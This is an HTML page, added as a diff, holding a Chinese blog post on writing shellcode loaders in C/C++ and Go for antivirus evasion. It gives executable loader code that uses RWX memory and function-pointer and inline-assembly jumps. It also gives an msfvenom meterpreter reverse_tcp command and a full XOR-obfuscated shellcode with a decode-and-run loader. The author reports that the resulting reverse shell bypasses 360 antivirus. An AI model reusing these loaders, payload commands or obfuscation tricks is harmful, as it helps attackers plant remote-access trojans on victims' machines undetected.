@@ -1,0 +1,290 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>各语言ShellcodeLoader初探 | Lucky Future的技术栈</title><meta name="keywords" content="android,安全,渗透测试,逆向"><meta name="author" content="LuckyFuture"><meta name="copyright" content="LuckyFuture"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="各种语言版本实现shellcode加载，shellcode变形免杀初探">
+<meta property="og:type" content="article">
+<meta property="og:title" content="各语言ShellcodeLoader初探">
+<meta property="og:url" content="http://luckyfuture.top/ShellcodeLoader.html">
+<meta property="og:site_name" content="Lucky Future的技术栈">
+<meta property="og:description" content="各种语言版本实现shellcode加载，shellcode变形免杀初探">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328172923202.png">
+<meta property="article:published_time" content="2022-03-04T10:52:59.000Z">
+<meta property="article:modified_time" content="2022-03-28T13:57:25.868Z">
+<meta property="article:author" content="LuckyFuture">
+<meta property="article:tag" content="android,安全,渗透测试,逆向">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328172923202.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://luckyfuture.top/ShellcodeLoader"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?1347df1bbc1626b89dd2cc1d362b984c";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-978LXQR6H1"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-978LXQR6H1');
+</script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-28 21:57:25'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}const fontSizeVal = saveToLocal.get('global-font-size')
+if (fontSizeVal !== undefined) {
+  document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+}})()</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/rss.xml" title="Lucky Future的技术栈" type="application/rss+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328172923202.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Lucky Future的技术栈</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">各语言ShellcodeLoader初探</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-04T10:52:59.000Z" title="发表于 2022-03-04 18:52:59">2022-03-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-28T13:57:25.868Z" title="更新于 2022-03-28 21:57:25">2022-03-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80/">木马免杀</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/ShellcodeLoader.html#post-comment"><span class="waline-comment-count" id="/ShellcodeLoader.html"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>这是从0开始写ShellCode加载器的第0篇文章，文章列表，样本demo已上传到<a target="_blank" rel="noopener" href="https://github.com/luckyfuture0177/ReZeroBypassAV">GitHub</a></p>
+</blockquote>
+<h2 id="C-C-加载shellcode"><a href="#C-C-加载shellcode" class="headerlink" title="C/C++加载shellcode"></a>C/C++加载shellcode</h2><p>源码+shellcode直接编译：函数指针执行，汇编指令执行，申请动态内存</p>
+<p>使用加载器加载shellcode</p>
+<h3 id="函数指针执行"><a href="#函数指针执行" class="headerlink" title="函数指针执行"></a>函数指针执行</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="comment">//设置入口地址，不弹出黑窗口</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	((<span class="type">void</span>(*)(<span class="type">void</span>)) &amp; buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="申请动态内存加载"><a href="#申请动态内存加载" class="headerlink" title="申请动态内存加载"></a>申请动态内存加载</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	PVOID Memory;</span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(buf),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//动态分配虚地址空间</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">//复制内存内容</span></span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="内联汇编加载"><a href="#内联汇编加载" class="headerlink" title="内联汇编加载"></a>内联汇编加载</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)  </span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Go语言加载shellcode"><a href="#Go语言加载shellcode" class="headerlink" title="Go语言加载shellcode"></a>Go语言加载shellcode</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">	shellcode_buf = []<span class="type">byte</span>&#123;</span><br><span class="line">		<span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe4</span>, <span class="number">0xf0</span>, <span class="number">0xe8</span>, <span class="number">0xcc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x52</span>,</span><br><span class="line">		<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x60</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x18</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line">		<span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x4a</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>,</span><br><span class="line">		<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, </span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkErr</span><span class="params">(err <span class="type">error</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">			<span class="built_in">println</span>(err.Error())</span><br><span class="line">			os.Exit(<span class="number">1</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcode := shellcode_buf</span><br><span class="line">	addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;内存分配成功&quot;</span>)</span><br><span class="line">	_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;内存复制成功&quot;</span>)</span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用go加载shellcode有两个问题需要注意，一是shellcode要生成x64架构的，二是shellcode需要生成num格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=xxxxxxx lport=xxxx -a x64 -f num</span><br></pre></td></tr></table></figure>
+
+<h2 id="shellcode变形免杀初探"><a href="#shellcode变形免杀初探" class="headerlink" title="shellcode变形免杀初探"></a>shellcode变形免杀初探</h2><p>shellcode的本质是计算机可直接执行的机器码，比汇编语言更低一层的存在，对于msf生成的一段弹出calc.exe的shellcode，翻译成汇编语言如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">00446000 | FC               | cld                                   |</span><br><span class="line">00446001 | E8 82000000      | call shellcodeanalyse.446088          |</span><br><span class="line">00446006 | 60               | pushad                                |</span><br><span class="line">00446007 | 89E5             | mov ebp,esp                           | upper stack</span><br><span class="line">00446009 | 31C0             | xor eax,eax                           | eax:unsigned char * buf</span><br><span class="line">0044600B | 64:8B50 30       | mov edx,dword ptr fs:[eax+30]         | PEB</span><br><span class="line">0044600F | 8B52 0C          | mov edx,dword ptr ds:[edx+C]          | DllList</span><br><span class="line">00446012 | 8B52 14          | mov edx,dword ptr ds:[edx+14]         | InMemoryOrderModuleList</span><br><span class="line">00446015 | 8B72 28          | mov esi,dword ptr ds:[edx+28]         | Full_DLLNAME_Buffer</span><br><span class="line">00446018 | 0FB74A 26        | movzx ecx,word ptr ds:[edx+26]        | MaximumLength</span><br><span class="line">0044601C | 31FF             | xor edi,edi                           | edi:___argv</span><br><span class="line">0044601E | AC               | lodsb                                 |</span><br><span class="line">0044601F | 3C 61            | cmp al,61                             | upper(ch)</span><br><span class="line">00446021 | 7C 02            | jl shellcodeanalyse.446025            |</span><br><span class="line">00446023 | 2C 20            | sub al,20                             |</span><br><span class="line">00446025 | C1CF 0D          | ror edi,D                             | (rotate)res&gt;&gt; 0xD</span><br><span class="line">00446028 | 01C7             | add edi,eax                           | edi:___argv, eax:unsigned char * buf</span><br><span class="line">0044602A | E2 F2            | loop shellcodeanalyse.44601E          |</span><br><span class="line">0044602C | 52               | push edx                              | edi:hash of(dll name)</span><br><span class="line">0044602D | 57               | push edi                              | edi:___argv</span><br><span class="line">0044602E | 8B52 10          | mov edx,dword ptr ds:[edx+10]         | dllbase</span><br><span class="line">00446031 | 8B4A 3C          | mov ecx,dword ptr ds:[edx+3C]         | nt_headers</span><br><span class="line">00446034 | 8B4C11 78        | mov ecx,dword ptr ds:[ecx+edx+78]     | export_entry</span><br><span class="line">00446038 | E3 48            | jecxz shellcodeanalyse.446082         | jump if ecx==0 judge if export</span><br></pre></td></tr></table></figure>
+
+<p>原文<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35740100/article/details/116300959">https://blog.csdn.net/qq_35740100/article/details/116300959</a></p>
+<p>结合一段弹出calc的shellcode进行试验</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220214210558174.png" alt="image-20220214210558174"></p>
+<p>有程序的输出可知，shellcode的长度为194字节，\x意味着后面是16进制。所以shellcode就是一段194字节长的16进制数据。由于shellcode是16进制而不是字符串的缘故，用常规的加密思路去处理显得很困难。</p>
+<p>在这里我使用异或的方法处理shellcode，异或的特点是原数据经过两次异或后与原来相同，本例中最终的buf经过函数指针执行是可以正常启动calc.exe的。将第一次异或后密文保存，使用时在代码中解密，就是变形免杀的初步思想。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220214212414026.png" alt="image-20220214212414026"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x88\xa\xa\xa\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a\x81\x58\x6\x81\x58\x1e\x81\x78\x22\x5\xbd\x40\x2c\x3b\xf5\xa6\x36\x6b\x76\x8\x26\x2a\xcb\xc5\x7\xb\xcd\xe8\xf8\x58\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\xb\xdb\x5b\x81\x53\x2a\xb\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81\xb\xdc\x3b\xf5\xa6\xcb\xc5\x7\xb\xcd\x32\xea\x7f\xfc\x9\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\xb\xd9\x6c\x81\x6\x41\x81\x52\x16\xb\xd9\x81\xe\x81\xb\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1\x87\x57\x60\xb\x87\x8f\xb8\xa\xa\xa\x5a\x62\x3b\x81\x65\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf\x36\xc\x76\x0\x8a\xf1\xea\x7f\xf\xb1\x4d\x19\x78\x65\x60\xa\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\xa\xa&quot;</span>;</span><br><span class="line">	<span class="type">int</span> shellcodesize = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,shellcodesize);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;shellcodesize; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i] ^= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	((<span class="type">void</span>(*)(<span class="type">void</span>)) &amp; buf)(); </span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将shellcode换成反弹shell再次进行试验，360动态静态全部免杀正常上线。但是当360开启鲲鹏引擎时动静都被查杀。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220214215609208.png" alt="image-20220214215609208"></p>
+<p>windows defender直接查杀</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220214214317184.png" alt="image-20220214214317184"></p>
+<p>从vt查杀率来看，效果还有待提高，不过相比未作处理已有很大改善。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220214220213323.png" alt="image-20220214220213323"></p>
